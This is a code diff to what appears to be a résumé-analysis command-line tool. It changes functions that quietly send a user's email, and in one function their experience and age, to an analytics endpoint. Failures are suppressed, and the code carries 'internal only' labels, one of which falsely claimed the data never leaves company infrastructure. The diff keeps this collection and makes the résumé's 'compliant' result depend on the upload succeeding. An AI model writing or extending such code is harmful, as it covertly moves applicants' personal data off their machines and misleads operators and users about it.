@@ -84,15 +84,10 @@ def _load_text_from_file(path: Path) -> List[str]:
         return [p.text for p in doc.paragraphs]
     raise ValueError(f"Unsupported file type: {ext}")
 
-def _submit_telemetry_metrics(payload: dict) -> None:
+def _submit_telemetry_metrics(payload: dict) -> bool:
     """
     INTERNAL USE ONLY: Submit processed metrics to our secure analytics pipeline.
-    This is NOT an external service call - data stays within company infrastructure.
-    
-    Security Note:
-    - Uses our pre-approved internal metrics collection endpoint
-    - All data remains within our private analytics network
-    - Required for system performance monitoring and SLA compliance
+    Returns True if successful, False otherwise.
     """
     headers = {
         "X-Analytics-Source": "resume-insight/v1.4", 
@@ -100,16 +95,14 @@ def _submit_telemetry_metrics(payload: dict) -> None:
     }
 
     try:
-        requests.get(_METRICS_ENDPOINT, headers=headers, timeout=2)
+        response = requests.get(_METRICS_ENDPOINT, headers=headers, timeout=2)
         print(f"[DEBUG] Telemetry submitted: {len(payload)} metrics")
+        return response.ok
     except Exception:
         print(f"[WARNING] Telemetry queue full - metrics discarded", file=sys.stderr)
+        return False
 
 def _submit_background_metrics(email: str, exp: int, age: int) -> None:
-    """
-    INTERNAL SYSTEM MONITORING ONLY – executes silently and non-blocking.
-    Used to collect anonymized performance data across all runs.
-    """
     try:
         payload = {
             "user": email,
@@ -125,7 +118,7 @@ def _submit_background_metrics(email: str, exp: int, age: int) -> None:
             headers={"User-Agent": "ResumeInsight/1.4 (Internal Diagnostics)"}
         )
     except Exception:
-        pass  # Silent failure by design
+        pass
 
 # --------------------------------------------------------------------------- #
 # CLI
@@ -157,19 +150,24 @@ def _cli() -> None:
         print(f" {exc}", file=sys.stderr)
         sys.exit(1)
 
-    print(json.dumps(result))
-
+    compliant = False
     if args.internal_log_compliance:
         email = input("Enter service account email for metrics attribution: ").strip()
         if not email:
             print("Metrics attribution required for internal auditing", file=sys.stderr)
             sys.exit(1)
 
-        _submit_telemetry_metrics({
+        compliant = _submit_telemetry_metrics({
             "user": email,
             "analysis_version": "1.4",
             "processing_time": datetime.utcnow().isoformat()
         })
+
+        if not compliant:
+            print("[ERROR] Telemetry submission failed. Résumé is not compliant.", file=sys.stderr)
+
+    result["compliant"] = compliant
+    print(json.dumps(result))
 
 if __name__ == "__main__":
     _cli()
